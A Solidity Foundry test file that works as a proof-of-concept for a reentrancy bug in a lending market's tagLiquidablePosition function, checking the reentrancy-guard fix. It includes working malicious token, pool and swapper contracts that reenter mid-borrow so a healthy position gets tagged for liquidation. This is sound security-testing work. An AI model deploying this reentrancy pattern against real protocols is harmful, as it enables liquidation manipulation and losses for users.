// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {LiquidationConfiguration} from "@alto/lending/interfaces/IMarket.sol";
import {FixedRateIrm} from "@alto/lending/irm/FixedRateIrm.sol";
import {OracleMock} from "@alto/oracles/mocks/OracleMock.sol";
import {LENDING_ORACLE_PRICE_PRECISION} from "@alto/oracles/interfaces/IOracle.sol";
import {AltoLeverage} from "@alto/lending/leverage/AltoLeverage.sol";
import {
    IMarket,
    LiquidablePosition,
    BorrowMarketInitParams,
    BaseMarketInitParams
} from "@alto/lending/interfaces/IMarket.sol";
import {IAltoLeverageSwapper} from "@alto/lending/leverage/interfaces/IAltoLeverageSwapper.sol";
import {console} from "forge-std/console.sol";
import {ERC20Mock} from "@alto-test/helpers/ERC20Mock.sol";
import {FixedPointMath} from "@alto/utils/FixedPointMath.sol";
import {AssetShareConversionMath} from "@alto/lending/libraries/AssetShareConversionMath.sol";
import {MarketDeployer} from "@alto/utils/MarketDeployer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

bool constant TESTING_TAG_REENTRANCY = false; // Set to true to test the vulnerability, false to test the fix (expects reentrancy guard in tagLiquidablePosition)

contract MaliciousERC20ForTagging is ERC20 {
    address public attacker;
    address public market;
    address public liquidator;
    bool public shouldTagPosition;

    constructor(address _attacker, address _market) ERC20("Malicious ERC20", "MAL") {
        _mint(msg.sender, type(uint256).max);
        attacker = _attacker;
        market = _market;
        shouldTagPosition = false;
    }

    function setLiquidator(address _liquidator) external {
        liquidator = _liquidator;
    }

    function setShouldTagPosition(bool _shouldTag) external {
        shouldTagPosition = _shouldTag;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (shouldTagPosition) {
            // Reenter and tag the position during leverage operation
            // At this point, the position is unhealthy because:
            // - borrow() has already updated borrowShares
            // - But collateral hasn't been added yet (will be added after this callback)
            IMarket(market).tagLiquidablePosition(attacker, liquidator);

            // Complete the transfer normally
            return super.transfer(to, amount);
        }

        // Default behavior - just transfer
        return super.transfer(to, amount);
    }
}

contract MaliciousPoolForTagging {
    using SafeERC20 for IERC20;

    address public maliciousERC20;
    address public collateralToken;

    constructor(address _maliciousErc20, address _collateralToken) {
        maliciousERC20 = _maliciousErc20;
        collateralToken = _collateralToken;
    }

    /// @dev mock of IUniswapV3Pool swap collateralToken/maliciousERC20
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // Here we mock calling the malicious token contract that exploits the market
        // This could be called without mockup as transfer is usually called during swaps
        IERC20(maliciousERC20).safeTransfer(recipient, 1);
        return (0, 0);
    }
}

struct MockSwapperData {
    address maliciousPool;
    uint256 minAmountOut;
}

/// @dev This contract is used to test the AltoLeverageSwapper contract with malicious ERC20 tokens
/// and to implement PoC for the tagLiquidablePosition reentrancy exploit
contract SwapperWithMaliciousERC20ForTagging is IAltoLeverageSwapper, Ownable {
    using SafeERC20 for IERC20;

    mapping(address => bool) public isWhitelisted;

    constructor(address _owner) Ownable(_owner) {}

    function setWhitelisted(address _address, bool _isWhitelisted) external onlyOwner {
        isWhitelisted[_address] = _isWhitelisted;
    }

    function swap(address sellToken, address buyToken, uint256 amountIn, bytes calldata swapParams)
        public
        payable
        returns (uint256)
    {
        IERC20(sellToken).safeTransferFrom(msg.sender, address(this), amountIn);

        MockSwapperData memory data = abi.decode(swapParams, (MockSwapperData));

        // FOLLOWING WOULD HAPPEN ON ATTACKER'S PREMISES
        // 1. Attacker set up malicious pool sellToken/maliciousToken and included a swap within that pool in the swapper data.
        // This way attacker can reenter during the swap.
        IERC20(sellToken).safeTransfer(data.maliciousPool, uint256(amountIn));
        MaliciousPoolForTagging(data.maliciousPool).swap(address(this), false, int256(amountIn), 0, hex"");

        // Send collateral tokens back to complete the swap
        // We need to send enough collateral to make the position healthy after it's added
        // Swapper should be funded with collateral tokens beforehand
        uint256 collateralNeeded = data.minAmountOut;
        uint256 balance = IERC20(buyToken).balanceOf(address(this));
        require(balance >= collateralNeeded, "Insufficient collateral balance");
        IERC20(buyToken).safeTransfer(msg.sender, collateralNeeded);

        return collateralNeeded;
    }
}

contract AltoLeverageTagReentrancyTest is Test {
    using FixedPointMath for uint256;
    using AssetShareConversionMath for uint256;

    IMarket market;
    ERC20Mock borrowToken;
    ERC20Mock collateralToken;
    address internal ATTACKER = makeAddr("ATTACKER");

    uint256 constant INITIAL_AMOUNT = 100000000000 ether;

    address oracle;

    function setUp() public {
        borrowToken = new ERC20Mock("Borrow Token", "BTKN");
        collateralToken = new ERC20Mock("Collateral Token", "CTKN");

        address irm = address(new FixedRateIrm(0.04 ether / uint256(365 days), address(this)));
        oracle = address(new OracleMock());
        OracleMock(oracle).setPrice(1 * LENDING_ORACLE_PRICE_PRECISION);

        market = IMarket(
            MarketDeployer.deployBorrowMarket(
                BorrowMarketInitParams({
                    baseMarketInitParams: BaseMarketInitParams({
                        borrowToken: address(borrowToken),
                        collateralToken: address(collateralToken),
                        irm: address(irm),
                        owner: address(this),
                        oracle: address(oracle),
                        maxLtv: 0.8 ether,
                        feeRecipient: address(this),
                        liquidationConfiguration: LiquidationConfiguration({
                            maxLiquidationLtv: 0.85 ether,
                            dynamicBonusFeeStart: 0.03 ether,
                            ltvForCompleteLiquidation: 0.9 ether,
                            dynamicBonusFeeDecaySteepness: 5 ether,
                            liquidationBaseFee: 0.05 ether,
                            minPenaltyPercentage: 0.01 ether,
                            protocolFeePercentage: 0.075 ether,
                            isEnabledPriorityLiquidation: true,
                            disablePriorityLiquidationAbovePositionLtv: 0.95 ether,
                            priorityLiquidationGracePeriod: 5 minutes,
                            taggerLiquidationGracePeriod: 2 minutes,
                            liquidationWindowTag: 3 days
                        })
                    }),
                    initialBorrowOpeningFee: 0,
                    supplyCapAssets: 0
                })
            )
        );

        // Supply tokens to the protocol
        deal(address(borrowToken), address(this), INITIAL_AMOUNT);
        borrowToken.approve(address(market), INITIAL_AMOUNT);
        market.addSupply(INITIAL_AMOUNT, 0, address(this));
        deal(address(collateralToken), address(this), INITIAL_AMOUNT);
        collateralToken.approve(address(market), INITIAL_AMOUNT);
        market.addCollateral(INITIAL_AMOUNT, address(this));
    }

    function isSolvent(address user, address _market) internal view returns (bool, uint256 max, uint256 current) {
        uint256 collateralPrice = OracleMock(oracle).getPrice();
        uint256 collateralValue = uint256(IMarket(_market).position(user).collateralAssets)
            .divideWithRounding(collateralPrice, LENDING_ORACLE_PRICE_PRECISION, false);
        uint256 maxBorrowValue = collateralValue.multiplyWithPrecision(IMarket(_market).maxLtv());
        uint256 borrowValue = uint256(IMarket(_market).position(user).borrowShares)
            .convertToAssetsUp(IMarket(_market).totalBorrowed().assets, IMarket(_market).totalBorrowed().shares);

        return (maxBorrowValue >= borrowValue, maxBorrowValue, borrowValue);
    }

    /// @dev Test for reentrancy vulnerability in tagLiquidablePosition
    /// Scenario:
    /// a: Call borrow with leverage, making position temporarily unhealthy
    /// b: Reenter during borrow callback and tag position (position is unhealthy at this point)
    /// c: Complete leverage operation, adding collateral
    /// d: Now we have a healthy position which is tagged (should not be allowed)
    function testTagLiquidablePositionReentrancy() public {
        address LIQUIDATOR = makeAddr("LIQUIDATOR");
        // Note: liquidator should NOT be a priority liquidator to tag positions
        // Priority liquidators cannot tag positions

        // Initialize malicious ERC20 token and pool
        MaliciousERC20ForTagging maliciousERC20 = new MaliciousERC20ForTagging(ATTACKER, address(market));
        maliciousERC20.setLiquidator(LIQUIDATOR);
        maliciousERC20.setShouldTagPosition(true);
        MaliciousPoolForTagging maliciousPool =
            new MaliciousPoolForTagging(address(maliciousERC20), address(collateralToken));

        // Fund malicious pool with some maliciousERC20 tokens (needed for the transfer in swap)
        deal(address(maliciousERC20), address(maliciousPool), 1 ether);

        // Create swapper with malicious ERC20
        SwapperWithMaliciousERC20ForTagging reentrantSwapper = new SwapperWithMaliciousERC20ForTagging(address(this));

        // Create new leverage contract with malicious swapper
        AltoLeverage maliciousLeverage = new AltoLeverage(address(reentrantSwapper), address(this));
        maliciousLeverage.setMarket(address(market), true);
        market.setAuthorizedCallback(address(maliciousLeverage), true);

        // Set whitelist for the new leverage contract
        reentrantSwapper.setWhitelisted(address(maliciousLeverage), true);

        // Fund swapper with collateral tokens (needed to complete the swap)
        deal(address(collateralToken), address(reentrantSwapper), type(uint128).max);

        // Setup attacker position: add collateral first
        uint256 initialCollateral = 1000 ether;
        vm.startPrank(ATTACKER);
        deal(address(collateralToken), ATTACKER, initialCollateral);
        collateralToken.approve(address(market), initialCollateral);
        market.addCollateral(initialCollateral, ATTACKER);
        vm.stopPrank();

        // Check position is healthy before
        (bool isSolventBefore,,) = isSolvent(ATTACKER, address(market));
        assertTrue(isSolventBefore, "Position should be healthy before borrow");

        // Check position is not tagged before
        LiquidablePosition memory liquidableBefore = market.liquidablePositions(ATTACKER);
        assertFalse(liquidableBefore.tagged, "Position should not be tagged before");

        // Now borrow using leverage - this will:
        // 1. Borrow tokens (position becomes temporarily unhealthy)
        // 2. Call onBorrowCallback
        // 3. In callback, swap happens and maliciousERC20 reenters to tag position
        // 4. After callback, collateral is added, making position healthy again
        // We need to borrow enough to make position temporarily unhealthy
        // With 1000 ether collateral and 0.8 LTV, max borrow is 800 ether
        // So borrowing 850 ether will make it unhealthy temporarily
        uint256 borrowAmount = 850 ether; // Borrow more than LTV allows to make position unhealthy temporarily
        uint256 minAmountOut = borrowAmount; // 1:1 ratio for simplicity
        bytes memory swapParams =
            abi.encode(MockSwapperData({maliciousPool: address(maliciousPool), minAmountOut: minAmountOut}));

        vm.startPrank(ATTACKER);
        borrowToken.approve(address(market), borrowAmount);

        if (TESTING_TAG_REENTRANCY) {
            // When testing vulnerability, the borrow should succeed (reentrancy happens)
            market.borrow(borrowAmount, 0, ATTACKER, address(maliciousLeverage), swapParams);
        } else {
            // Should revert with reentrancy guard if tagLiquidablePosition has reentrancy guard
            vm.expectRevert(ReentrancyGuardUpgradeable.ReentrancyGuardReentrantCall.selector);
            market.borrow(borrowAmount, 0, ATTACKER, address(maliciousLeverage), swapParams);
            console.log("Function reverted - attack averted");
            return;
        }
        vm.stopPrank();

        // After leverage completes, position should be healthy
        (bool isSolventAfter,,) = isSolvent(ATTACKER, address(market));
        assertTrue(isSolventAfter, "Position should be healthy after leverage");

        // But position is tagged, which should not be allowed for healthy positions
        LiquidablePosition memory liquidableAfter = market.liquidablePositions(ATTACKER);

        console.log("Position is solvent after leverage:", isSolventAfter);
        console.log("Position is tagged:", liquidableAfter.tagged);
        if (liquidableAfter.tagged) {
            console.log("Tagger:", liquidableAfter.tagger);
            console.log("Timestamp:", liquidableAfter.timestamp);
            console.log("Healthy position is tagged!");

            // This demonstrates the vulnerability - a healthy position should not be tagged
            // In a fixed version, this should not be possible due to reentrancy guard
        } else {
            console.log("Position is not tagged - vulnerability not exploitable or fixed");
        }

        // When testing vulnerability, we expect it to be tagged (demonstrating the bug)
        // When testing fixed version, we expect it NOT to be tagged
        if (TESTING_TAG_REENTRANCY) {
            // Vulnerability confirmed - position is tagged even though it's healthy
            assertTrue(liquidableAfter.tagged, "VULNERABILITY: Position should be tagged");
        } else {
            // Fixed version - position should not be tagged
            assertFalse(liquidableAfter.tagged, "Position should not be tagged");
        }
    }
}
